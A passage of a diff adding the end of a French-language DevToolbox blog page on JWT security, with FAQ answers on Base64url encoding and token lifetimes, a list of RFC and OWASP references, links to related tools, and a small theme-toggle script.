+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">Les charges utiles JWT sont encodées en Base64url, pas chiffrées. Base64url est une transformation complètement réversible — toute personne qui possède le jeton peut décoder chaque champ sans connaître aucune clé secrète. Cela inclut les serveurs, les CDN, les agrégateurs de logs, les extensions de navigateur et toute personne qui intercepte le trafic réseau sur HTTP. Si vous devez transmettre des revendications chiffrées, utilisez <strong>JWE (JSON Web Encryption)</strong> — un standard distinct (RFC 7516) qui fournit la confidentialité.</p>
+      </div>
+    </details>
+
+    <details class="faq-item" itemscope itemprop="mainEntity" itemtype="https://schema.org/Question">
+      <summary itemprop="name">Quelle est la durée de vie recommandée pour un jeton d'accès JWT ?</summary>
+      <div class="faq-answer" itemscope itemprop="acceptedAnswer" itemtype="https://schema.org/Answer">
+        <p itemprop="text">15 minutes est la recommandation la plus courante pour les applications sensibles. Cela limite la fenêtre d'exploitation si un jeton est volé — un attaquant qui capture un jeton de 15 minutes a au maximum 15 minutes d'accès. Associez cela à un jeton de rafraîchissement de 7 jours stocké dans un cookie httpOnly. Pour les applications à faible risque (contenu public, données non sensibles), 1 heure est acceptable. Pour les contextes de haute sécurité (banque, santé), envisagez 5 minutes ou même moins avec un rafraîchissement silencieux fréquent.</p>
+      </div>
+    </details>
+  </div>
+
+  <!-- ══════════════════════════════════
+       REFERENCES
+  ══════════════════════════════════ -->
+  <section class="references">
+    <h3>Sources et références</h3>
+    <ul class="ref-list">
+      <li><a href="https://www.rfc-editor.org/rfc/rfc7519" target="_blank" rel="noopener noreferrer">RFC 7519 — JSON Web Token (JWT), IETF, 2015</a> — la spécification officielle JWT définissant le format, les revendications et les règles de validation.</li>
+      <li><a href="https://www.rfc-editor.org/rfc/rfc7518" target="_blank" rel="noopener noreferrer">RFC 7518 — JSON Web Algorithms (JWA), IETF, 2015</a> — définitions des algorithmes cryptographiques pour la signature et le chiffrement JWT.</li>
+      <li><a href="https://www.rfc-editor.org/rfc/rfc7516" target="_blank" rel="noopener noreferrer">RFC 7516 — JSON Web Encryption (JWE), IETF, 2015</a> — le standard de chiffrement pour les charges utiles JWT confidentielles.</li>
+      <li><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" rel="noopener noreferrer">Tim McLean — Critical vulnerabilities in JSON Web Token libraries (Blog Auth0, 2015)</a> — la divulgation originale des vulnérabilités de confusion d'algorithme et "none".</li>
+      <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens" target="_blank" rel="noopener noreferrer">OWASP — Testing JSON Web Tokens (WSTG-SESS-10)</a> — le guide de test officiel de l'OWASP pour les vulnérabilités JWT.</li>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" target="_blank" rel="noopener noreferrer">OWASP — Fiche mémo JWT</a> — conseils de sécurité pratiques pour l'implémentation JWT multi-langages.</li>
+      <li><a href="https://portswigger.net/web-security/jwt" target="_blank" rel="noopener noreferrer">PortSwigger — Attaques JWT (Web Security Academy)</a> — couverture approfondie de la confusion d'algorithme, de l'injection d'en-tête et des attaques kid.</li>
+      <li><a href="https://www.rfc-editor.org/rfc/rfc6749" target="_blank" rel="noopener noreferrer">RFC 6749 — OAuth 2.0 Authorization Framework, IETF, 2012</a> — le cadre d'autorisation qui définit les concepts de jetons d'accès et de rafraîchissement.</li>
+      <li><a href="https://datatracker.ietf.org/doc/html/rfc6819" target="_blank" rel="noopener noreferrer">RFC 6819 — OAuth 2.0 Threat Model and Security Considerations, IETF, 2013</a> — analyse des menaces pour les systèmes d'authentification basés sur des jetons.</li>
+      <li><a href="https://developer.mozilla.org/fr/docs/Web/HTTP/Headers/Set-Cookie" target="_blank" rel="noopener noreferrer">MDN — Set-Cookie : attributs HttpOnly, Secure, SameSite</a> — comportement des navigateurs pour les attributs de cookies sécurisés.</li>
+    </ul>
+  </section>
+
+  <!-- ══════════════════════════════════
+       RELATED TOOLS
+  ══════════════════════════════════ -->
+  <div class="related-tools">
+    <h3>Outils DevToolbox connexes</h3>
+    <ul>
+      <li><a href="/fr/outils/decodeur-jwt/">→ Décodeur JWT & Analyseur de sécurité</a> — décodez n'importe quel JWT, obtenez une note de sécurité, détectez les vulnérabilités d'algorithme et les revendications manquantes</li>
+      <li><a href="/fr/outils/convertisseur-timestamp/">→ Convertisseur de timestamp Unix</a> — convertissez les valeurs des revendications <code>exp</code>, <code>iat</code>, <code>nbf</code> en dates lisibles</li>
+      <li><a href="/fr/outils/analyseur-headers-http/">→ Analyseur d'en-têtes HTTP</a> — analysez l'en-tête Authorization et l'en-tête Set-Cookie qui transporte les jetons de rafraîchissement</li>
+      <li><a href="/fr/outils/encodeur-base64/">→ Encodeur / Décodeur Base64</a> — inspectez manuellement les sections Base64url de l'en-tête et de la charge utile JWT</li>
+      <li><a href="/fr/outils/generateur-uuid/">→ Générateur d'UUID</a> — générez des UUID cryptographiquement aléatoires pour les revendications <code>jti</code></li>
+    </ul>
+  </div>
+
+  </div><!-- /articleBody -->
+</article>
+</main>
+
+<footer class="footer">
+  <p>&copy; 2026 <a href="/">DevToolbox</a> — Outils gratuits pour les développeurs.
+  <a href="/fr/blog/">Blog</a> | <a href="/fr/a-propos/">À propos</a> | <a href="/fr/contact/">Contact</a></p>
+</footer>
+</div>
+
+<script>
+function switchLang(lang) {
+  ['python','node','go','java','php'].forEach(l => {
+    const el = document.getElementById('lang-' + l);
+    if (el) el.classList.toggle('visible', l === lang);
+  });
+  document.querySelectorAll('.lang-tab').forEach((t, i) => {
+    t.classList.toggle('active', ['python','node','go','java','php'][i] === lang);
+  });
+}
+
+function toggleTheme() {
+  const dark = document.body.classList.toggle('dark');
+  document.getElementById('themeBtn').textContent = dark ? '☀️ Clair' : '🌙 Sombre';
+  localStorage.setItem('devtoolbox-theme', dark ? 'dark' : 'light');
+}
+(function() {
+  const s = localStorage.getItem('devtoolbox-theme') || 'light';
+  if (s === 'dark') {
+    document.body.classList.add('dark');
+    document.getElementById('themeBtn').textContent = '☀️ Clair';
+  }
+})();
+</script>
+</body>
+</html>
